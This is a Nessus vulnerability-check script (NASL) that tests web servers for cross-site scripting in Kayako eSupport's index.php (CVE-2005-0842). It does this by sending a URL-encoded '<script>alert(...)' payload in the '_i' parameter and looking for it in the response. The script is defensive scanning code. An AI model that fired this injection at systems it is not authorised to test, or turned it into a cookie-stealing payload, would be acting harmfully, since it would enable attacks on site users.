#
# (C) Tenable Network Security
#


if (description) {
  script_id(17598);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2005-0842");
  script_bugtraq_id(12868);

  name["english"] = "Kayako eSupport Index.PHP Multiple Cross-Site Scripting Vulnerabilities";
  script_name(english:name["english"]);
 
  desc["english"] = "
Synopsis :

The remote web server contains a PHP script that is affected by
several cross-site scripting vulnerabilities. 

Description :

The version of Kayako eSupport installed on the remote host is subject
to multiple cross-site scripting vulnerabilities in the script
'index.php' through the parameters '_i' and '_c'.  These issues may
allow an attacker to inject HTML and script code into a user's browser
within the context of the remote site, enabling him to steal
authentication cookies, access data recently submitted by the user, and
the like. 

See also : 

http://www.securityfocus.com/archive/1/393946
http://forums.kayako.com/showthread.php?t=2689

Solution : 

Upgrade to eSupport 2.3.1 or later.

Risk factor : 

Low / CVSS Base Score : 2 
(AV:R/AC:H/Au:NR/C:P/A:N/I:N/B:N)";
  script_description(english:desc["english"]);
 
  summary["english"] = "Checks for multiple cross-site scripting vulnerabilities in Kayako eSupport's index.php";
  script_summary(english:summary["english"]);
 
  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses : XSS");
 
  script_copyright(english:"This script is Copyright (C) 2005-2006 Tenable Network Security");

  script_dependencies("http_version.nasl", "cross_site_scripting.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("http_func.inc");
include("http_keepalive.inc");
include("url_func.inc");


port = get_http_port(default:80);
if (!get_port_state(port)) exit(0);
if (!can_host_php(port:port)) exit(0);
if ( get_kb_item("www/" + port + "/generic_xss") ) exit(0);


# A simple alert.
xss = string("<script>alert('", SCRIPT_NAME, "');</script>");
exss = urlencode(str:xss);


# Try the exploit.
foreach dir (cgi_dirs()) {
  req = http_get(
    item:string(
      dir, "/index.php?",
      "_a=knowledgebase&",
      "_j=questiondetails&",
      "_i=[1]['%3e", exss, "]"
    ), 
    port:port
  );
  res = http_keepalive_send_recv(port:port, data:req, bodyonly:1);
  if (res == NULL) exit(0);

  # If we see our XSS, there's a problem.
  if (xss >< res) {
    security_warning(port:port);
    exit(0);
  }
}
